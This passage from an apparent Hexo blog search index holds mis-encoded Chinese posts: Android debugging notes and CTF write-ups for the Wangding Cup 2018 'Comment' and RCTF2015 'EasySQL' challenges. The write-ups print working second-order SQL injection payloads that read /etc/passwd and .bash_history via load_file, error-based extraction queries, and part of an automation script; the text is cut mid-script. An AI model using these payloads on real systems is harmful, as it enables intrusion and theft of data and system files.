operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 'F'&lt;'FLAG','G'>'FLAG',æ‰€ä»¥è¦å‡1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>buuctfä¸Šflagè¿˜å¾—è½¬æˆå°å†™æ‰èƒ½æäº¤ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> æ— åˆ—åæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Androidå´©æºƒç¬”è®°</title>
      <link href="/p/288737676.html"/>
      <url>/p/288737676.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è®°å½•ä¸€ä¸‹å­¦ä¹ å®‰å“æ—¶é€æ¸å´©æºƒçš„å¿ƒè·¯å†ç¨‹ã€‚</p><p>å®‰å“æ˜¯ç™½å¤©å­¦çš„ï¼Œäººæ˜¯æ™šä¸Šèµ°çš„ã€‚</p><p>åŠåŠå­å­¦androidæ˜¯è¿™æ ·çš„ï¼Œæ¯ä¸ªé—®é¢˜éƒ½è®©æˆ‘å•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šçš„å´©æºƒä¹±å«ã€‚</p><h2 id="android-content-res-Resources-NotFoundException-String-resource-ID"><a href="#android-content-res-Resources-NotFoundException-String-resource-ID" class="headerlink" title="android.content.res.Resources$NotFoundException: String resource ID"></a>android.content.res.Resources$NotFoundException: String resource ID</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">followedNumTV<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>userInfo<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFollowedNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”±äº<code>getFollowedNum()</code>è¿”å›çš„æ˜¯integerï¼ŒsetTextåˆåªæ¥æ”¶stringï¼Œååideæ²¡æç¤ºï¼ï¼ï¼</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">followedNumTV<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>userInfo<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFollowedNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="è°ƒç”¨org-json-JSONObject-æŠ¥é”™Stub"><a href="#è°ƒç”¨org-json-JSONObject-æŠ¥é”™Stub" class="headerlink" title="è°ƒç”¨org.json.JSONObject æŠ¥é”™Stub!"></a>è°ƒç”¨org.json.JSONObject æŠ¥é”™Stub!</h2><p>è¿™ç©æ„åªèƒ½åœ¨å®‰å“ä¸­è¿è¡Œï¼Œä¸èƒ½ç›´æ¥ç”¨javaè¿è¡Œã€‚</p><h2 id="ç½‘ç»œè¯·æ±‚ç”¨Retrofit2-Rxjava2"><a href="#ç½‘ç»œè¯·æ±‚ç”¨Retrofit2-Rxjava2" class="headerlink" title="ç½‘ç»œè¯·æ±‚ç”¨Retrofit2+Rxjava2"></a>ç½‘ç»œè¯·æ±‚ç”¨Retrofit2+Rxjava2</h2><p>å®‰å“ä¸­ä¸å…è®¸ä¸»çº¿ç¨‹æ‰§è¡Œç½‘ç»œè¯·æ±‚ï¼Œæ‰€ä»¥è¦å¦å¯»ä»–æ³•ã€‚</p><p>è€ŒRetrofit2ä¸­ä¹Ÿæœ‰<code>.enqueue()</code>æ¥è¿›è¡Œå¼‚æ­¥æ“ä½œï¼Œä½†å¤„ç†è¿”å›å€¼ä¼¼ä¹æœ‰ç‚¹éº»çƒ¦ï¼Œäºæ˜¯ç”¨Rxjava2æ¥è¿›è¡Œçº¿ç¨‹è°ƒåº¦ã€‚</p><p>å¥½æ–‡å…±èµï¼š<a href="https://gank.io/post/560e15be2dca930e00da1083">ç»™ Android å¼€å‘è€…çš„ RxJava è¯¦è§£</a></p><h2 id="JSONå¤„ç†"><a href="#JSONå¤„ç†" class="headerlink" title="JSONå¤„ç†"></a>JSONå¤„ç†</h2><p>ç”¨gsonæˆ–è€…fastjsonã€‚</p><p>ä¸€å¼€å§‹æ‹’ç»å»ºjavabeanï¼Œç”¨fastjsonå°†è¿”å›å€¼è½¬mapæŠ˜è…¾äº†å¾ˆä¹…ã€‚</p><p>æœ€ç»ˆè´¥ç»™äº†å¼‚æ­¥è¯·æ±‚ï¼Œè¿˜æ˜¯å¾—å»ºjavabeanã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> DEBUG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[ç½‘é¼æ¯ 2018]Comment</title>
      <link href="/p/2243940947.html"/>
      <url>/p/2243940947.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[ç•™è¨€|è¯„è®º|å‘å¸–]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706193426485.png" alt="image-20210706193426485"></p><p>è¿™é¢˜çœŸçš„éš¾ã€‚</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>å‘å¸–è¦ç™»å½•ï¼Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706193537032.png" alt="image-20210706193537032"></p><p>çˆ†ç ´ä¸€ä¸‹ï¼Œå¯†ç æ˜¯zhangwei666ã€‚</p><h3 id="1-gitæ³„æ¼"><a href="#1-gitæ³„æ¼" class="headerlink" title="1.gitæ³„æ¼"></a>1.gitæ³„æ¼</h3><p>æ‰«ç›®å½•æ‰«å‡º/.gitï¼Œç”¨githackä¸‹è½½ä¸€ä¸‹æºç ï¼Œå‘ç°æ˜¯ä¸å…¨çš„ã€‚</p><p><code>git log</code>ä¸€ä¸‹ï¼Œæ˜¯ç©ºçš„ã€‚</p><p><code>git log --reflog</code>æœ‰ä¸å°‘ä¸œè¥¿</p><p>åœ¨é¢˜ç›®F12 CONSOLEå¤„ä¹Ÿèƒ½çœ‹åˆ°æç¤ºã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706194210821.png" alt="image-20210706194210821"></p><blockquote><p><code>git log --reflog</code> æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯çš„æ‰€æœ‰æ“ä½œè®°å½•ï¼ˆåŒ…æ‹¬å·²ç»è¢«åˆ é™¤çš„commitè®°å½•å’Œresetçš„æ“ä½œï¼‰</p></blockquote><p><code>git reset --hard commitè®°å½•</code>ï¼Œè¿˜åŸä¸€ä¸‹æºç </p><h3 id="2-SQLæ³¨å…¥"><a href="#2-SQLæ³¨å…¥" class="headerlink" title="2.SQLæ³¨å…¥"></a>2.SQLæ³¨å…¥</h3><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706194036881.png" alt="image-20210706194036881"></p><p><code>addslashes()</code>ä¸€ä¸‹å°±è”æƒ³åˆ°æ˜¨å¤©åšçš„ä¸€é“é¢˜ï¼Œåˆ©ç”¨åŠ çš„<code>\</code>æ¥æ³¨é‡Šåé¢ä¸€ä¸ªå•å¼•å·ã€‚ä¸è¿‡è¿™é¢˜ä¼¼ä¹æ²¡æœºä¼š</p><p>åœ¨æ­¤æµ‹è¯•ä¸‹</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706195931843.png" alt="image-20210706195931843"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706195938395.png" alt="image-20210706195938395"></p><p>å¯çŸ¥</p><blockquote><p>æ•°æ®åº“ä¼šè‡ªåŠ¨æ¸…é™¤åæ–œæ </p></blockquote><p>æ‰€ä»¥ï¼Œå¦‚æœ<code>addslashes()</code>å¤„ç†çš„å€¼å¾€æ•°æ®åº“é‡Œèµ°ä¸€åœˆï¼Œç›¸å½“äºæ²¡å¤„ç†ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706200140233.png" alt="image-20210706200140233"></p><p><code>category</code>ä»æ•°æ®åº“ä¸­å–å€¼ï¼Œæ¼æ´ç‚¹å°±åœ¨è¿™</p><p>æ¢³ç†ä¸‹äºŒæ¬¡æ³¨å…¥é€»è¾‘</p><p>æ³¨æ„çœ‹è¿™å¥è¯ï¼Œè¿™æ ·æ¢è¡Œå†™sqlè¯­å¥ï¼Œé‚£å†™å…¥çš„sqlè¯­å¥ä¹Ÿæ˜¯æœ‰æ¢è¡Œç¬¦å­˜åœ¨çš„ï¼Œæ‰€ä»¥ç”¨<code>#</code>æ¥æ³¨é‡Šåé¢çš„å†…å®¹å°±ä¸å¥½ä½¿äº†ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706202819141.png" alt="image-20210706202819141"></p><p>ç¬¬ä¸€æ¬¡ï¼Œåœ¨catagoryé‡Œè¾“å…¥</p><pre class="line-numbers language-none"><code class="language-none">1&#39;,content&#x3D;user(),&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶ååœ¨è¯„è®ºcontenté‡Œè¾“å…¥<code>*/#</code>å°±ä¼šå½¢æˆå…¥ä¸‹å›¾æ‰€ç¤ºä»£ç ï¼š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706202627995.png" alt="image-20210706202627995"></p><p>ç¬¬äºŒè¡Œçš„<code>/*</code>ä¸ç¬¬ä¸‰è¡Œçš„<code>*/</code>é¥ç›¸å‘¼åº”ï¼Œå°†ä¸­é—´çš„ç»™æ³¨é‡Šäº†ï¼Œè€Œç¬¬ä¸‰è¡Œçš„<code>#</code>ï¼Œå°†åé¢çš„<code>å•å¼•å·</code>å’Œ<code>é€—å·</code>ç»™æ³¨é‡Šäº†ã€‚</p><p>ç¬¬å››è¡Œè¿˜æœ‰ä¸€å¥ä¸èƒ½å¿½ç•¥ï¼Œæ‰€ä»¥é‚£ä¸ªé€—å·ä¹Ÿéœ€è¦åŠ ã€‚</p><p>äºæ˜¯ï¼Œæ³¨å…¥æˆç«‹ã€‚</p><p>è¿™é‡Œç»™äº†ä¸ªrootæƒé™ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæç¤º</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706203110292.png" alt="image-20210706203110292"></p><blockquote><p>è¯´æ˜flagä¸åœ¨æ•°æ®åº“è€Œåœ¨æœ¬åœ°æ–‡ä»¶é‡Œï¼Œéœ€è¦è¯»å–ã€‚åœ¨æ•°æ®åº“ä¸­æ— éœ€rootæƒé™ã€‚</p></blockquote><p>è¯»å–/etc/passwd</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">',content=(select load_file('</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706203558299.png" alt="image-20210706203558299"></p><p>ä¸€èˆ¬è®¾ç½®webçš„éƒ½æ˜¯wwwç”¨æˆ·ï¼Œæ‰€ä»¥æ‰¾wwwã€‚</p><p>æ‰¾åˆ°wwwç”¨æˆ·ç›®å½•<code>/home/www/</code></p><p>è¯»ä¸‹å†å²å‘½ä»¤è®°å½•</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">',content=(select load_file('</span><span class="token operator">/</span>home<span class="token operator">/</span>www<span class="token operator">/</span><span class="token punctuation">.</span>bash_history'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>.bash_historyä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤</p></blockquote><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706203803113.png" alt="image-20210706203803113"></p><p>åˆ é™¤äº†<code>/var/www/html/.DS_Store</code></p><p>ä½†æ˜¯æ²¡åˆ <code>/tmp/html/.DS_Store</code></p><blockquote><p>.DS_Storeæ˜¯Mac OSä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ï¼Œå¦‚æ–‡ä»¶çš„å›¾æ ‡ä½ç½®æˆ–èƒŒæ™¯è‰²ï¼Œç›¸å½“äºWindowsçš„desktop.iniã€‚ç»å¸¸ä¼šæœ‰ä¸€äº›ä¸å¯è§çš„å­—ç¬¦</p></blockquote><p>æ‰€ä»¥è¯»å–ä¸‹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">',content=(select load_file('</span><span class="token operator">/</span>tmp<span class="token operator">/</span>html<span class="token operator">/</span><span class="token punctuation">.</span>DS_Store'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706204250029.png" alt="image-20210706204250029"></p><p>ç”¨<code>hex()</code>è½¬æ¢ä¸‹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">',content=(select hex(load_file('</span><span class="token operator">/</span>tmp<span class="token operator">/</span>html<span class="token operator">/</span><span class="token punctuation">.</span>DS_Store'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸€å¤§å †16è¿›åˆ¶ï¼Œè§£ä¸ªç </p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706204545320.png" alt="image-20210706204545320"></p><p>æœ€åè¯»å–ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">1&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;))),&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœä¸åŠ <code>hex()</code>ï¼Œé‚£è¿˜å¾—æŸ¥çœ‹æºç </p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/image-20210706204946881.png" alt="image-20210706204946881"></p><p>æ¸¸æˆç»“æŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[RCTF2015]EasySQL</title>
      <link href="/p/929805825.html"/>
      <url>/p/929805825.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706152613750.png" alt="image-20210706152613750"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706152622228.png" alt="image-20210706152622228"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>å…³é”®è¯:[äºŒæ¬¡æ³¨å…¥|å…ˆç™»åæ”¹|æ”¹å¯†|æ­£åˆ™]</p><p>æ³¨å†Œçš„æ—¶å€™æœ‰è¿‡æ»¤</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706152941359.png" alt="image-20210706152941359"></p><p>è·‘ä¸ªfuzzè¯•è¯•ï¼Œé™åˆ¶äº†è¿™äº›å­—ç¬¦ï¼š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706160422510.png"></p><p>æ³¨å†Œä¸ªè´¦å·ä¸º<code>1&quot;</code></p><p>æ”¹å¯†ç æç¤ºï¼š</p><pre class="line-numbers language-none"><code class="language-none">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot; and pwd&#x3D;&#39;c81e728d9d4c2f636f067f89cc14862c&#39;&#39; at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>çœ‹æ¥æ˜¯åŒå¼•å·é—­åˆã€‚</p><p>äºŒæ¬¡æ³¨å…¥é€»è¾‘æ¢³ç†ï¼šæ³¨å†Œè´¦æˆ·å†™å…¥sqlæ³¨å…¥ä»£ç =&gt;ä¿®æ”¹å¯†ç è§¦å‘sqlæ³¨å…¥ä»£ç </p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h4 id="çˆ†è¡¨"><a href="#çˆ†è¡¨" class="headerlink" title="çˆ†è¡¨"></a>çˆ†è¡¨</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>"<span class="token operator">||</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706162112767.png" alt="image-20210706162112767"></p><h4 id="çˆ†åˆ—"><a href="#çˆ†åˆ—" class="headerlink" title="çˆ†åˆ—"></a>çˆ†åˆ—</h4><p>flagä¸åœ¨flagè¡¨ä¸­ï¼Œåœ¨usersè¡¨ä¸­ï¼Œæ³¨æ„ï¼Œå¦‚æœæ˜¯burpsuiteæˆ–hackbarå‘åŒ…ï¼Œè®°å¾—å°†&amp;&amp;è½¬ç </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>"<span class="token operator">||</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706162645199.png" alt="image-20210706162645199"></p><h4 id="çˆ†æ•°æ®"><a href="#çˆ†æ•°æ®" class="headerlink" title="çˆ†æ•°æ®"></a>çˆ†æ•°æ®</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>"<span class="token operator">||</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åâ€¦â€¦</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706164756534.png" alt="image-20210706164756534"></p><p>è¦ä¹ˆæŠŠflagæœç´¢å‡ºæ¥ï¼Œè¦ä¹ˆå†™è„šæœ¬æ…¢æ…¢è·‘.</p><h5 id="1-ç­›é€‰"><a href="#1-ç­›é€‰" class="headerlink" title="1.ç­›é€‰"></a>1.ç­›é€‰</h5><pre class="line-numbers language-none"><code class="language-none">#æ­£åº1&quot;||(extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))))%23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706171255380.png" alt="image-20210706171255380"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#é€†åº</span><span class="token number">1</span>"<span class="token operator">||</span><span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>reverse<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token operator">regexp</span><span class="token punctuation">(</span><span class="token string">'^f'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF2015-EasySQL/image-20210706170925330.png" alt="image-20210706170925330"></p><p>é€†åºè¾“å‡ºä¸‹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'dd286a765312-4e9b-bca4-fc93-77'</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#77-39cf-4acb-b9e4-213567a682dd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç»„åˆä¸‹flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;d6fd7577-39cf-4acb-b9e4-21           77-39cf-4acb-b9e4-213567a682dd&#125;flag&#123;d6fd7577-39cf-4acb-b9e4-213567a682dd&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="2-æŠ„ä¸ªç½‘ä¸Šçš„è„šæœ¬"><a href="#2-æŠ„ä¸ªç½‘ä¸Šçš„è„šæœ¬" class="headerlink" title="2.æŠ„ä¸ªç½‘ä¸Šçš„è„šæœ¬"></a>2.æŠ„ä¸ªç½‘ä¸Šçš„è„šæœ¬</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl_reg <span class="token operator">=</span> <span class="token string">'http://90ff4474-5dd7-447f-9a4e-54211f746fa2.node3.buuoj.cn/register.php'</span>url_log <span class="token operator">=</span> <span class="token string">'http://90ff4474-5dd7-447f-9a4e-54211f746fa2.node3.buuoj.cn/login.php'</span>url_change <span class="token operator">=</span> <span class="token string">'http://90ff4474-5dd7-447f-9a4e-54211f746fa2.node3.buuoj.cn/changepwd.php'</span>pre <span class="token operator">=</span> <span class="token string">'mochu7"'</span><span class="token comment">#é€†åºé—­åˆ</span>suf <span class="token operator">=</span> <span class="token string">"')))),1))#"</span><span class="token comment">#æ­£åºé—­åˆ</span><span class="token comment">#suf = "'))),1))#"</span>s <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz1234567890'</span>s <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'username'</span> <span class="token punctuation">:</span> name<span class="token punctuation">,</span>        <span class="token string">'password'</span> <span class="token punctuation">:</span> <span class="token string">'123'</span><span class="token punctuation">,</span>        <span class="token string">'email'</span> <span class="token punctuation">:</span> <span class="token string">'123'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url_reg<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'username'</span> <span class="token punctuation">:</span> name<span class="token punctuation">,</span>        <span class="token string">'password'</span> <span class="token punctuation">:</span> <span class="token string">'123'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    r<span class="token punctuation">.</span>post<span class="token 